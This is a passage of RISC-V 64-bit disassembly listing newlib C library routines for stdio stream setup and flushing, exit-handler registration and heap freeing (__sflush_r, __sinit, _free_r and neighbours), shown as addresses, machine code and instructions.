   1212a:	bf85                	j	1209a <__swsetup_r+0x3c>
   1212c:	8b89                	andi	a5,a5,2
   1212e:	4701                	li	a4,0
   12130:	e391                	bnez	a5,12134 <__swsetup_r+0xd6>
   12132:	5018                	lw	a4,32(s0)
   12134:	c458                	sw	a4,12(s0)
   12136:	bff1                	j	12112 <__swsetup_r+0xb4>

0000000000012138 <__register_exitproc>:
   12138:	8401b703          	ld	a4,-1984(gp) # 1c1f8 <_global_impure_ptr>
   1213c:	832a                	mv	t1,a0
   1213e:	1f873783          	ld	a5,504(a4)
   12142:	e789                	bnez	a5,1214c <__register_exitproc+0x14>
   12144:	20070793          	addi	a5,a4,512
   12148:	1ef73c23          	sd	a5,504(a4)
   1214c:	4798                	lw	a4,8(a5)
   1214e:	487d                	li	a6,31
   12150:	557d                	li	a0,-1
   12152:	04e84463          	blt	a6,a4,1219a <__register_exitproc+0x62>
   12156:	02030a63          	beqz	t1,1218a <__register_exitproc+0x52>
   1215a:	00371813          	slli	a6,a4,0x3
   1215e:	983e                	add	a6,a6,a5
   12160:	10c83823          	sd	a2,272(a6)
   12164:	3107a883          	lw	a7,784(a5)
   12168:	4605                	li	a2,1
   1216a:	00e6163b          	sllw	a2,a2,a4
   1216e:	00c8e8b3          	or	a7,a7,a2
   12172:	3117a823          	sw	a7,784(a5)
   12176:	20d83823          	sd	a3,528(a6)
   1217a:	4689                	li	a3,2
   1217c:	00d31763          	bne	t1,a3,1218a <__register_exitproc+0x52>
   12180:	3147a683          	lw	a3,788(a5)
   12184:	8e55                	or	a2,a2,a3
   12186:	30c7aa23          	sw	a2,788(a5)
   1218a:	0017069b          	addiw	a3,a4,1
   1218e:	0709                	addi	a4,a4,2
   12190:	070e                	slli	a4,a4,0x3
   12192:	c794                	sw	a3,8(a5)
   12194:	97ba                	add	a5,a5,a4
   12196:	e38c                	sd	a1,0(a5)
   12198:	4501                	li	a0,0
   1219a:	8082                	ret

000000000001219c <__call_exitprocs>:
   1219c:	715d                	addi	sp,sp,-80
   1219e:	f44e                	sd	s3,40(sp)
   121a0:	8401b983          	ld	s3,-1984(gp) # 1c1f8 <_global_impure_ptr>
   121a4:	f052                	sd	s4,32(sp)
   121a6:	ec56                	sd	s5,24(sp)
   121a8:	e85a                	sd	s6,16(sp)
   121aa:	e486                	sd	ra,72(sp)
   121ac:	e0a2                	sd	s0,64(sp)
   121ae:	fc26                	sd	s1,56(sp)
   121b0:	f84a                	sd	s2,48(sp)
   121b2:	e45e                	sd	s7,8(sp)
   121b4:	8aaa                	mv	s5,a0
   121b6:	8a2e                	mv	s4,a1
   121b8:	4b05                	li	s6,1
   121ba:	1f89b403          	ld	s0,504(s3)
   121be:	c801                	beqz	s0,121ce <__call_exitprocs+0x32>
   121c0:	4404                	lw	s1,8(s0)
   121c2:	34fd                	addiw	s1,s1,-1
   121c4:	00349913          	slli	s2,s1,0x3
   121c8:	9922                	add	s2,s2,s0
   121ca:	0004dd63          	bgez	s1,121e4 <__call_exitprocs+0x48>
   121ce:	60a6                	ld	ra,72(sp)
   121d0:	6406                	ld	s0,64(sp)
   121d2:	74e2                	ld	s1,56(sp)
   121d4:	7942                	ld	s2,48(sp)
   121d6:	79a2                	ld	s3,40(sp)
   121d8:	7a02                	ld	s4,32(sp)
   121da:	6ae2                	ld	s5,24(sp)
   121dc:	6b42                	ld	s6,16(sp)
   121de:	6ba2                	ld	s7,8(sp)
   121e0:	6161                	addi	sp,sp,80
   121e2:	8082                	ret
   121e4:	000a0963          	beqz	s4,121f6 <__call_exitprocs+0x5a>
   121e8:	21093783          	ld	a5,528(s2)
   121ec:	01478563          	beq	a5,s4,121f6 <__call_exitprocs+0x5a>
   121f0:	34fd                	addiw	s1,s1,-1
   121f2:	1961                	addi	s2,s2,-8
   121f4:	bfd9                	j	121ca <__call_exitprocs+0x2e>
   121f6:	441c                	lw	a5,8(s0)
   121f8:	01093683          	ld	a3,16(s2)
   121fc:	37fd                	addiw	a5,a5,-1
   121fe:	02979663          	bne	a5,s1,1222a <__call_exitprocs+0x8e>
   12202:	c404                	sw	s1,8(s0)
   12204:	d6f5                	beqz	a3,121f0 <__call_exitprocs+0x54>
   12206:	31042703          	lw	a4,784(s0)
   1220a:	009b163b          	sllw	a2,s6,s1
   1220e:	00842b83          	lw	s7,8(s0)
   12212:	8f71                	and	a4,a4,a2
   12214:	2701                	sext.w	a4,a4
   12216:	ef09                	bnez	a4,12230 <__call_exitprocs+0x94>
   12218:	9682                	jalr	a3
   1221a:	4418                	lw	a4,8(s0)
   1221c:	1f89b783          	ld	a5,504(s3)
   12220:	f9771de3          	bne	a4,s7,121ba <__call_exitprocs+0x1e>
   12224:	fcf406e3          	beq	s0,a5,121f0 <__call_exitprocs+0x54>
   12228:	bf49                	j	121ba <__call_exitprocs+0x1e>
   1222a:	00093823          	sd	zero,16(s2)
   1222e:	bfd9                	j	12204 <__call_exitprocs+0x68>
   12230:	31442783          	lw	a5,788(s0)
   12234:	11093583          	ld	a1,272(s2)
   12238:	8ff1                	and	a5,a5,a2
   1223a:	2781                	sext.w	a5,a5
   1223c:	e781                	bnez	a5,12244 <__call_exitprocs+0xa8>
   1223e:	8556                	mv	a0,s5
   12240:	9682                	jalr	a3
   12242:	bfe1                	j	1221a <__call_exitprocs+0x7e>
   12244:	852e                	mv	a0,a1
   12246:	9682                	jalr	a3
   12248:	bfc9                	j	1221a <__call_exitprocs+0x7e>

000000000001224a <__sflush_r>:
   1224a:	01059783          	lh	a5,16(a1)
   1224e:	7179                	addi	sp,sp,-48
   12250:	f022                	sd	s0,32(sp)
   12252:	03079713          	slli	a4,a5,0x30
   12256:	9341                	srli	a4,a4,0x30
   12258:	ec26                	sd	s1,24(sp)
   1225a:	f406                	sd	ra,40(sp)
   1225c:	e84a                	sd	s2,16(sp)
   1225e:	e44e                	sd	s3,8(sp)
   12260:	00877693          	andi	a3,a4,8
   12264:	84aa                	mv	s1,a0
   12266:	842e                	mv	s0,a1
   12268:	10069063          	bnez	a3,12368 <__sflush_r+0x11e>
   1226c:	6705                	lui	a4,0x1
   1226e:	80070713          	addi	a4,a4,-2048 # 800 <_start-0xf8b0>
   12272:	8fd9                	or	a5,a5,a4
   12274:	4598                	lw	a4,8(a1)
   12276:	00f59823          	sh	a5,16(a1)
   1227a:	00e04d63          	bgtz	a4,12294 <__sflush_r+0x4a>
   1227e:	59b8                	lw	a4,112(a1)
   12280:	00e04a63          	bgtz	a4,12294 <__sflush_r+0x4a>
   12284:	4501                	li	a0,0
   12286:	70a2                	ld	ra,40(sp)
   12288:	7402                	ld	s0,32(sp)
   1228a:	64e2                	ld	s1,24(sp)
   1228c:	6942                	ld	s2,16(sp)
   1228e:	69a2                	ld	s3,8(sp)
   12290:	6145                	addi	sp,sp,48
   12292:	8082                	ret
   12294:	6438                	ld	a4,72(s0)
   12296:	d77d                	beqz	a4,12284 <__sflush_r+0x3a>
   12298:	0004a903          	lw	s2,0(s1)
   1229c:	03379693          	slli	a3,a5,0x33
   122a0:	0004a023          	sw	zero,0(s1)
   122a4:	780c                	ld	a1,48(s0)
   122a6:	0806d863          	bgez	a3,12336 <__sflush_r+0xec>
   122aa:	6850                	ld	a2,144(s0)
   122ac:	01045783          	lhu	a5,16(s0)
   122b0:	8b91                	andi	a5,a5,4
   122b2:	c799                	beqz	a5,122c0 <__sflush_r+0x76>
   122b4:	441c                	lw	a5,8(s0)
   122b6:	8e1d                	sub	a2,a2,a5
   122b8:	6c3c                	ld	a5,88(s0)
   122ba:	c399                	beqz	a5,122c0 <__sflush_r+0x76>
   122bc:	583c                	lw	a5,112(s0)
   122be:	8e1d                	sub	a2,a2,a5
   122c0:	643c                	ld	a5,72(s0)
   122c2:	780c                	ld	a1,48(s0)
   122c4:	4681                	li	a3,0
   122c6:	8526                	mv	a0,s1
   122c8:	9782                	jalr	a5
   122ca:	57fd                	li	a5,-1
   122cc:	01045683          	lhu	a3,16(s0)
   122d0:	00f51d63          	bne	a0,a5,122ea <__sflush_r+0xa0>
   122d4:	409c                	lw	a5,0(s1)
   122d6:	4775                	li	a4,29
   122d8:	08f76263          	bltu	a4,a5,1235c <__sflush_r+0x112>
   122dc:	20400737          	lui	a4,0x20400
   122e0:	0705                	addi	a4,a4,1
   122e2:	00f75733          	srl	a4,a4,a5
   122e6:	8b05                	andi	a4,a4,1
   122e8:	cb35                	beqz	a4,1235c <__sflush_r+0x112>
   122ea:	77fd                	lui	a5,0xfffff
   122ec:	7ff78793          	addi	a5,a5,2047 # fffffffffffff7ff <_end+0xffffffffffdcecd7>
   122f0:	6c18                	ld	a4,24(s0)
   122f2:	8ff5                	and	a5,a5,a3
   122f4:	0107979b          	slliw	a5,a5,0x10
   122f8:	4107d79b          	sraiw	a5,a5,0x10
   122fc:	e018                	sd	a4,0(s0)
   122fe:	00f41823          	sh	a5,16(s0)
   12302:	00042423          	sw	zero,8(s0)
   12306:	03379713          	slli	a4,a5,0x33
   1230a:	00075863          	bgez	a4,1231a <__sflush_r+0xd0>
   1230e:	57fd                	li	a5,-1
   12310:	00f51463          	bne	a0,a5,12318 <__sflush_r+0xce>
   12314:	409c                	lw	a5,0(s1)
   12316:	e391                	bnez	a5,1231a <__sflush_r+0xd0>
   12318:	e848                	sd	a0,144(s0)
   1231a:	6c2c                	ld	a1,88(s0)
   1231c:	0124a023          	sw	s2,0(s1)
   12320:	d1b5                	beqz	a1,12284 <__sflush_r+0x3a>
   12322:	07440793          	addi	a5,s0,116
   12326:	00f58563          	beq	a1,a5,12330 <__sflush_r+0xe6>
   1232a:	8526                	mv	a0,s1
   1232c:	368000ef          	jal	ra,12694 <_free_r>
   12330:	04043c23          	sd	zero,88(s0)
   12334:	bf81                	j	12284 <__sflush_r+0x3a>
   12336:	4601                	li	a2,0
   12338:	4685                	li	a3,1
   1233a:	8526                	mv	a0,s1
   1233c:	9702                	jalr	a4
   1233e:	57fd                	li	a5,-1
   12340:	862a                	mv	a2,a0
   12342:	f6f515e3          	bne	a0,a5,122ac <__sflush_r+0x62>
   12346:	409c                	lw	a5,0(s1)
   12348:	d3b5                	beqz	a5,122ac <__sflush_r+0x62>
   1234a:	4775                	li	a4,29
   1234c:	00e78563          	beq	a5,a4,12356 <__sflush_r+0x10c>
   12350:	4759                	li	a4,22
   12352:	04e79463          	bne	a5,a4,1239a <__sflush_r+0x150>
   12356:	0124a023          	sw	s2,0(s1)
   1235a:	b72d                	j	12284 <__sflush_r+0x3a>
   1235c:	0406e793          	ori	a5,a3,64
   12360:	00f41823          	sh	a5,16(s0)
   12364:	557d                	li	a0,-1
   12366:	b705                	j	12286 <__sflush_r+0x3c>
   12368:	0185b983          	ld	s3,24(a1)
   1236c:	f0098ce3          	beqz	s3,12284 <__sflush_r+0x3a>
   12370:	0005b903          	ld	s2,0(a1)
   12374:	8b0d                	andi	a4,a4,3
   12376:	0135b023          	sd	s3,0(a1)
   1237a:	4139093b          	subw	s2,s2,s3
   1237e:	4781                	li	a5,0
   12380:	e311                	bnez	a4,12384 <__sflush_r+0x13a>
   12382:	519c                	lw	a5,32(a1)
   12384:	c45c                	sw	a5,12(s0)
   12386:	ef205fe3          	blez	s2,12284 <__sflush_r+0x3a>
   1238a:	603c                	ld	a5,64(s0)
   1238c:	780c                	ld	a1,48(s0)
   1238e:	86ca                	mv	a3,s2
   12390:	864e                	mv	a2,s3
   12392:	8526                	mv	a0,s1
   12394:	9782                	jalr	a5
   12396:	00a04763          	bgtz	a0,123a4 <__sflush_r+0x15a>
   1239a:	01045783          	lhu	a5,16(s0)
   1239e:	0407e793          	ori	a5,a5,64
   123a2:	bf7d                	j	12360 <__sflush_r+0x116>
   123a4:	99aa                	add	s3,s3,a0
   123a6:	40a9093b          	subw	s2,s2,a0
   123aa:	bff1                	j	12386 <__sflush_r+0x13c>

00000000000123ac <_fflush_r>:
   123ac:	1101                	addi	sp,sp,-32
   123ae:	e822                	sd	s0,16(sp)
   123b0:	ec06                	sd	ra,24(sp)
   123b2:	842a                	mv	s0,a0
   123b4:	c519                	beqz	a0,123c2 <_fflush_r+0x16>
   123b6:	493c                	lw	a5,80(a0)
   123b8:	e789                	bnez	a5,123c2 <_fflush_r+0x16>
   123ba:	e42e                	sd	a1,8(sp)
   123bc:	108000ef          	jal	ra,124c4 <__sinit>
   123c0:	65a2                	ld	a1,8(sp)
   123c2:	01059783          	lh	a5,16(a1)
   123c6:	c799                	beqz	a5,123d4 <_fflush_r+0x28>
   123c8:	8522                	mv	a0,s0
   123ca:	6442                	ld	s0,16(sp)
   123cc:	60e2                	ld	ra,24(sp)
   123ce:	6105                	addi	sp,sp,32
   123d0:	e7bff06f          	j	1224a <__sflush_r>
   123d4:	60e2                	ld	ra,24(sp)
   123d6:	6442                	ld	s0,16(sp)
   123d8:	4501                	li	a0,0
   123da:	6105                	addi	sp,sp,32
   123dc:	8082                	ret

00000000000123de <fflush>:
   123de:	85aa                	mv	a1,a0
   123e0:	e909                	bnez	a0,123f2 <fflush+0x14>
   123e2:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_global_impure_ptr>
   123e6:	000125b7          	lui	a1,0x12
   123ea:	3ac58593          	addi	a1,a1,940 # 123ac <_fflush_r>
   123ee:	7a60006f          	j	12b94 <_fwalk_reent>
   123f2:	8481b503          	ld	a0,-1976(gp) # 1c200 <_impure_ptr>
   123f6:	fb7ff06f          	j	123ac <_fflush_r>

00000000000123fa <__fp_lock>:
   123fa:	4501                	li	a0,0
   123fc:	8082                	ret

00000000000123fe <_cleanup_r>:
   123fe:	000185b7          	lui	a1,0x18
   12402:	c3a58593          	addi	a1,a1,-966 # 17c3a <_fclose_r>
   12406:	78e0006f          	j	12b94 <_fwalk_reent>

000000000001240a <std.isra.0>:
   1240a:	1141                	addi	sp,sp,-16
   1240c:	e022                	sd	s0,0(sp)
   1240e:	e406                	sd	ra,8(sp)
   12410:	842a                	mv	s0,a0
   12412:	00b51823          	sh	a1,16(a0)
   12416:	00c51923          	sh	a2,18(a0)
   1241a:	00053023          	sd	zero,0(a0)
   1241e:	00053423          	sd	zero,8(a0)
   12422:	0a052623          	sw	zero,172(a0)
   12426:	00053c23          	sd	zero,24(a0)
   1242a:	02052023          	sw	zero,32(a0)
   1242e:	02052423          	sw	zero,40(a0)
   12432:	4621                	li	a2,8
   12434:	4581                	li	a1,0
   12436:	0a450513          	addi	a0,a0,164
   1243a:	c20fe0ef          	jal	ra,1085a <memset>
   1243e:	000167b7          	lui	a5,0x16
   12442:	a1678793          	addi	a5,a5,-1514 # 15a16 <__sread>
   12446:	fc1c                	sd	a5,56(s0)
   12448:	000167b7          	lui	a5,0x16
   1244c:	a4c78793          	addi	a5,a5,-1460 # 15a4c <__swrite>
   12450:	e03c                	sd	a5,64(s0)
   12452:	000167b7          	lui	a5,0x16
   12456:	a9e78793          	addi	a5,a5,-1378 # 15a9e <__sseek>
   1245a:	e43c                	sd	a5,72(s0)
   1245c:	000167b7          	lui	a5,0x16
   12460:	ad678793          	addi	a5,a5,-1322 # 15ad6 <__sclose>
   12464:	f800                	sd	s0,48(s0)
   12466:	e83c                	sd	a5,80(s0)
   12468:	60a2                	ld	ra,8(sp)
   1246a:	6402                	ld	s0,0(sp)
   1246c:	0141                	addi	sp,sp,16
   1246e:	8082                	ret

0000000000012470 <__fp_unlock>:
   12470:	4501                	li	a0,0
   12472:	8082                	ret

0000000000012474 <__sfmoreglue>:
   12474:	1101                	addi	sp,sp,-32
   12476:	e426                	sd	s1,8(sp)
   12478:	0b000613          	li	a2,176
   1247c:	fff5849b          	addiw	s1,a1,-1
   12480:	02c484b3          	mul	s1,s1,a2
   12484:	e04a                	sd	s2,0(sp)
   12486:	892e                	mv	s2,a1
   12488:	e822                	sd	s0,16(sp)
   1248a:	ec06                	sd	ra,24(sp)
   1248c:	0c848593          	addi	a1,s1,200
   12490:	032020ef          	jal	ra,144c2 <_malloc_r>
   12494:	842a                	mv	s0,a0
   12496:	cd01                	beqz	a0,124ae <__sfmoreglue+0x3a>
   12498:	00053023          	sd	zero,0(a0)
   1249c:	01252423          	sw	s2,8(a0)
   124a0:	0561                	addi	a0,a0,24
   124a2:	e808                	sd	a0,16(s0)
   124a4:	0b048613          	addi	a2,s1,176
   124a8:	4581                	li	a1,0
   124aa:	bb0fe0ef          	jal	ra,1085a <memset>
   124ae:	8522                	mv	a0,s0
   124b0:	60e2                	ld	ra,24(sp)
   124b2:	6442                	ld	s0,16(sp)
   124b4:	64a2                	ld	s1,8(sp)
   124b6:	6902                	ld	s2,0(sp)
   124b8:	6105                	addi	sp,sp,32
   124ba:	8082                	ret

00000000000124bc <_cleanup>:
   124bc:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_global_impure_ptr>
   124c0:	f3fff06f          	j	123fe <_cleanup_r>

00000000000124c4 <__sinit>:
   124c4:	493c                	lw	a5,80(a0)
   124c6:	eba1                	bnez	a5,12516 <__sinit+0x52>
   124c8:	1141                	addi	sp,sp,-16
   124ca:	000127b7          	lui	a5,0x12
   124ce:	e406                	sd	ra,8(sp)
   124d0:	e022                	sd	s0,0(sp)
   124d2:	3fe78793          	addi	a5,a5,1022 # 123fe <_cleanup_r>
   124d6:	ed3c                	sd	a5,88(a0)
   124d8:	478d                	li	a5,3
   124da:	52f52423          	sw	a5,1320(a0)
   124de:	53850793          	addi	a5,a0,1336
   124e2:	842a                	mv	s0,a0
   124e4:	52f53823          	sd	a5,1328(a0)
   124e8:	52053023          	sd	zero,1312(a0)
   124ec:	6508                	ld	a0,8(a0)
   124ee:	4601                	li	a2,0
   124f0:	4591                	li	a1,4
   124f2:	f19ff0ef          	jal	ra,1240a <std.isra.0>
   124f6:	6808                	ld	a0,16(s0)
   124f8:	4605                	li	a2,1
   124fa:	45a5                	li	a1,9
   124fc:	f0fff0ef          	jal	ra,1240a <std.isra.0>
   12500:	6c08                	ld	a0,24(s0)
   12502:	4609                	li	a2,2
   12504:	45c9                	li	a1,18
   12506:	f05ff0ef          	jal	ra,1240a <std.isra.0>
   1250a:	4785                	li	a5,1
   1250c:	c83c                	sw	a5,80(s0)
   1250e:	60a2                	ld	ra,8(sp)
   12510:	6402                	ld	s0,0(sp)
   12512:	0141                	addi	sp,sp,16
   12514:	8082                	ret
   12516:	8082                	ret

0000000000012518 <__sfp>:
   12518:	1101                	addi	sp,sp,-32
   1251a:	e426                	sd	s1,8(sp)
   1251c:	8401b483          	ld	s1,-1984(gp) # 1c1f8 <_global_impure_ptr>
   12520:	e04a                	sd	s2,0(sp)
   12522:	ec06                	sd	ra,24(sp)
   12524:	48bc                	lw	a5,80(s1)
   12526:	e822                	sd	s0,16(sp)
   12528:	892a                	mv	s2,a0
   1252a:	e781                	bnez	a5,12532 <__sfp+0x1a>
   1252c:	8526                	mv	a0,s1
   1252e:	f97ff0ef          	jal	ra,124c4 <__sinit>
   12532:	52048493          	addi	s1,s1,1312
   12536:	6880                	ld	s0,16(s1)
   12538:	449c                	lw	a5,8(s1)
   1253a:	37fd                	addiw	a5,a5,-1
   1253c:	0007d663          	bgez	a5,12548 <__sfp+0x30>
   12540:	609c                	ld	a5,0(s1)
   12542:	cb89                	beqz	a5,12554 <__sfp+0x3c>
   12544:	6084                	ld	s1,0(s1)
   12546:	bfc5                	j	12536 <__sfp+0x1e>
   12548:	01041703          	lh	a4,16(s0)
   1254c:	c70d                	beqz	a4,12576 <__sfp+0x5e>
   1254e:	0b040413          	addi	s0,s0,176
   12552:	b7e5                	j	1253a <__sfp+0x22>
   12554:	4591                	li	a1,4
   12556:	854a                	mv	a0,s2
   12558:	f1dff0ef          	jal	ra,12474 <__sfmoreglue>
   1255c:	e088                	sd	a0,0(s1)
   1255e:	f17d                	bnez	a0,12544 <__sfp+0x2c>
   12560:	47b1                	li	a5,12
   12562:	00f92023          	sw	a5,0(s2)
   12566:	4401                	li	s0,0
   12568:	8522                	mv	a0,s0
   1256a:	60e2                	ld	ra,24(sp)
   1256c:	6442                	ld	s0,16(sp)
   1256e:	64a2                	ld	s1,8(sp)
   12570:	6902                	ld	s2,0(sp)
   12572:	6105                	addi	sp,sp,32
   12574:	8082                	ret
   12576:	77c1                	lui	a5,0xffff0
   12578:	2785                	addiw	a5,a5,1
   1257a:	0a042623          	sw	zero,172(s0)
   1257e:	00043023          	sd	zero,0(s0)
   12582:	00043423          	sd	zero,8(s0)
   12586:	c81c                	sw	a5,16(s0)
   12588:	00043c23          	sd	zero,24(s0)
   1258c:	02042023          	sw	zero,32(s0)
   12590:	02042423          	sw	zero,40(s0)
   12594:	4621                	li	a2,8
   12596:	4581                	li	a1,0
   12598:	0a440513          	addi	a0,s0,164
   1259c:	abefe0ef          	jal	ra,1085a <memset>
   125a0:	04043c23          	sd	zero,88(s0)
   125a4:	06042023          	sw	zero,96(s0)
   125a8:	06043c23          	sd	zero,120(s0)
   125ac:	08042023          	sw	zero,128(s0)
   125b0:	bf65                	j	12568 <__sfp+0x50>

00000000000125b2 <__sfp_lock_acquire>:
   125b2:	8082                	ret

00000000000125b4 <__sfp_lock_release>:
   125b4:	8082                	ret

00000000000125b6 <__sinit_lock_acquire>:
   125b6:	8082                	ret

00000000000125b8 <__sinit_lock_release>:
   125b8:	8082                	ret

00000000000125ba <__fp_lock_all>:
   125ba:	8481b503          	ld	a0,-1976(gp) # 1c200 <_impure_ptr>
   125be:	000125b7          	lui	a1,0x12
   125c2:	3fa58593          	addi	a1,a1,1018 # 123fa <__fp_lock>
   125c6:	56a0006f          	j	12b30 <_fwalk>

00000000000125ca <__fp_unlock_all>:
   125ca:	8481b503          	ld	a0,-1976(gp) # 1c200 <_impure_ptr>
   125ce:	000125b7          	lui	a1,0x12
   125d2:	47058593          	addi	a1,a1,1136 # 12470 <__fp_unlock>
   125d6:	55a0006f          	j	12b30 <_fwalk>

00000000000125da <_malloc_trim_r>:
   125da:	7139                	addi	sp,sp,-64
   125dc:	f04a                	sd	s2,32(sp)
   125de:	6971                	lui	s2,0x1c
   125e0:	f822                	sd	s0,48(sp)
   125e2:	f426                	sd	s1,40(sp)
   125e4:	ec4e                	sd	s3,24(sp)
   125e6:	e42e                	sd	a1,8(sp)
   125e8:	fc06                	sd	ra,56(sp)
   125ea:	89aa                	mv	s3,a0
   125ec:	9a890913          	addi	s2,s2,-1624 # 1b9a8 <__malloc_av_>
   125f0:	516020ef          	jal	ra,14b06 <__malloc_lock>
   125f4:	01093783          	ld	a5,16(s2)
   125f8:	65a2                	ld	a1,8(sp)
   125fa:	6784                	ld	s1,8(a5)
   125fc:	6785                	lui	a5,0x1
   125fe:	fdf78413          	addi	s0,a5,-33 # fdf <_start-0xf0d1>
   12602:	98f1                	andi	s1,s1,-4
   12604:	8c0d                	sub	s0,s0,a1
   12606:	9426                	add	s0,s0,s1
   12608:	8031                	srli	s0,s0,0xc
   1260a:	147d                	addi	s0,s0,-1
   1260c:	0432                	slli	s0,s0,0xc
   1260e:	00f45d63          	ble	a5,s0,12628 <_malloc_trim_r+0x4e>
   12612:	854e                	mv	a0,s3
   12614:	4f4020ef          	jal	ra,14b08 <__malloc_unlock>
   12618:	4501                	li	a0,0
   1261a:	70e2                	ld	ra,56(sp)
   1261c:	7442                	ld	s0,48(sp)
   1261e:	74a2                	ld	s1,40(sp)
   12620:	7902                	ld	s2,32(sp)
   12622:	69e2                	ld	s3,24(sp)
   12624:	6121                	addi	sp,sp,64
   12626:	8082                	ret
   12628:	4581                	li	a1,0
   1262a:	854e                	mv	a0,s3
   1262c:	2c0030ef          	jal	ra,158ec <_sbrk_r>
   12630:	01093783          	ld	a5,16(s2)
   12634:	97a6                	add	a5,a5,s1
   12636:	fcf51ee3          	bne	a0,a5,12612 <_malloc_trim_r+0x38>
   1263a:	408005b3          	neg	a1,s0
   1263e:	854e                	mv	a0,s3
   12640:	2ac030ef          	jal	ra,158ec <_sbrk_r>
   12644:	57fd                	li	a5,-1
   12646:	02f51663          	bne	a0,a5,12672 <_malloc_trim_r+0x98>
   1264a:	4581                	li	a1,0
   1264c:	854e                	mv	a0,s3
   1264e:	29e030ef          	jal	ra,158ec <_sbrk_r>
   12652:	01093703          	ld	a4,16(s2)
   12656:	46fd                	li	a3,31
   12658:	40e507b3          	sub	a5,a0,a4
   1265c:	faf6dbe3          	ble	a5,a3,12612 <_malloc_trim_r+0x38>
   12660:	8501b683          	ld	a3,-1968(gp) # 1c208 <__malloc_sbrk_base>
   12664:	0017e793          	ori	a5,a5,1
   12668:	e71c                	sd	a5,8(a4)
   1266a:	8d15                	sub	a0,a0,a3
   1266c:	0ca1a023          	sw	a0,192(gp) # 1ca78 <__malloc_current_mallinfo>
   12670:	b74d                	j	12612 <_malloc_trim_r+0x38>
   12672:	01093783          	ld	a5,16(s2)
   12676:	8c81                	sub	s1,s1,s0
   12678:	0014e493          	ori	s1,s1,1
   1267c:	e784                	sd	s1,8(a5)
   1267e:	0c01a783          	lw	a5,192(gp) # 1ca78 <__malloc_current_mallinfo>
   12682:	854e                	mv	a0,s3
   12684:	4087843b          	subw	s0,a5,s0
   12688:	0c81a023          	sw	s0,192(gp) # 1ca78 <__malloc_current_mallinfo>
   1268c:	47c020ef          	jal	ra,14b08 <__malloc_unlock>
   12690:	4505                	li	a0,1
   12692:	b761                	j	1261a <_malloc_trim_r+0x40>

0000000000012694 <_free_r>:
   12694:	1a058863          	beqz	a1,12844 <_free_r+0x1b0>
   12698:	1101                	addi	sp,sp,-32
   1269a:	e822                	sd	s0,16(sp)
   1269c:	e426                	sd	s1,8(sp)
   1269e:	842a                	mv	s0,a0
   126a0:	84ae                	mv	s1,a1
   126a2:	ec06                	sd	ra,24(sp)
   126a4:	462020ef          	jal	ra,14b06 <__malloc_lock>
   126a8:	ff84b503          	ld	a0,-8(s1)
   126ac:	6671                	lui	a2,0x1c
   126ae:	ff048693          	addi	a3,s1,-16
   126b2:	ffe57793          	andi	a5,a0,-2
   126b6:	9a860813          	addi	a6,a2,-1624 # 1b9a8 <__malloc_av_>
   126ba:	00f685b3          	add	a1,a3,a5
   126be:	6598                	ld	a4,8(a1)
   126c0:	01083803          	ld	a6,16(a6)
   126c4:	9a860613          	addi	a2,a2,-1624
   126c8:	9b71                	andi	a4,a4,-4
   126ca:	8905                	andi	a0,a0,1
   126cc:	04b81063          	bne	a6,a1,1270c <_free_r+0x78>
   126d0:	97ba                	add	a5,a5,a4
   126d2:	e909                	bnez	a0,126e4 <_free_r+0x50>
   126d4:	ff04b703          	ld	a4,-16(s1)
   126d8:	8e99                	sub	a3,a3,a4
   126da:	6a8c                	ld	a1,16(a3)
   126dc:	97ba                	add	a5,a5,a4
   126de:	6e98                	ld	a4,24(a3)
   126e0:	ed98                	sd	a4,24(a1)
   126e2:	eb0c                	sd	a1,16(a4)
   126e4:	0017e713          	ori	a4,a5,1
   126e8:	e698                	sd	a4,8(a3)
   126ea:	8581b703          	ld	a4,-1960(gp) # 1c210 <__malloc_trim_threshold>
   126ee:	ea14                	sd	a3,16(a2)
   126f0:	00e7e763          	bltu	a5,a4,126fe <_free_r+0x6a>
   126f4:	8781b583          	ld	a1,-1928(gp) # 1c230 <__malloc_top_pad>
   126f8:	8522                	mv	a0,s0
   126fa:	ee1ff0ef          	jal	ra,125da <_malloc_trim_r>
   126fe:	8522                	mv	a0,s0
   12700:	6442                	ld	s0,16(sp)
   12702:	60e2                	ld	ra,24(sp)
   12704:	64a2                	ld	s1,8(sp)
   12706:	6105                	addi	sp,sp,32
   12708:	4000206f          	j	14b08 <__malloc_unlock>
   1270c:	e598                	sd	a4,8(a1)
   1270e:	4801                	li	a6,0
   12710:	e10d                	bnez	a0,12732 <_free_r+0x9e>
   12712:	ff04b503          	ld	a0,-16(s1)
   12716:	68f1                	lui	a7,0x1c
   12718:	9b888893          	addi	a7,a7,-1608 # 1b9b8 <__malloc_av_+0x10>
   1271c:	8e89                	sub	a3,a3,a0
   1271e:	97aa                	add	a5,a5,a0
   12720:	6a88                	ld	a0,16(a3)
   12722:	07150e63          	beq	a0,a7,1279e <_free_r+0x10a>
   12726:	0186b883          	ld	a7,24(a3)
   1272a:	01153c23          	sd	a7,24(a0)
   1272e:	00a8b823          	sd	a0,16(a7)
   12732:	00e58533          	add	a0,a1,a4
   12736:	6508                	ld	a0,8(a0)
   12738:	8905                	andi	a0,a0,1
   1273a:	ed19                	bnez	a0,12758 <_free_r+0xc4>
   1273c:	97ba                	add	a5,a5,a4
   1273e:	6998                	ld	a4,16(a1)
   12740:	06081163          	bnez	a6,127a2 <_free_r+0x10e>
   12744:	6571                	lui	a0,0x1c
   12746:	9b850513          	addi	a0,a0,-1608 # 1b9b8 <__malloc_av_+0x10>
   1274a:	04a71c63          	bne	a4,a0,127a2 <_free_r+0x10e>
   1274e:	f614                	sd	a3,40(a2)
   12750:	f214                	sd	a3,32(a2)
   12752:	ee98                	sd	a4,24(a3)
   12754:	ea98                	sd	a4,16(a3)
   12756:	4805                	li	a6,1
   12758:	0017e713          	ori	a4,a5,1
   1275c:	e698                	sd	a4,8(a3)
   1275e:	00f68733          	add	a4,a3,a5
   12762:	e31c                	sd	a5,0(a4)
   12764:	f8081de3          	bnez	a6,126fe <_free_r+0x6a>
   12768:	1ff00713          	li	a4,511
   1276c:	02f76f63          	bltu	a4,a5,127aa <_free_r+0x116>
   12770:	838d                	srli	a5,a5,0x3
   12772:	2781                	sext.w	a5,a5
   12774:	4027d59b          	sraiw	a1,a5,0x2
   12778:	4705                	li	a4,1
   1277a:	00b71733          	sll	a4,a4,a1
   1277e:	2785                	addiw	a5,a5,1
   12780:	660c                	ld	a1,8(a2)
   12782:	0017979b          	slliw	a5,a5,0x1
   12786:	078e                	slli	a5,a5,0x3
   12788:	97b2                	add	a5,a5,a2
   1278a:	8f4d                	or	a4,a4,a1
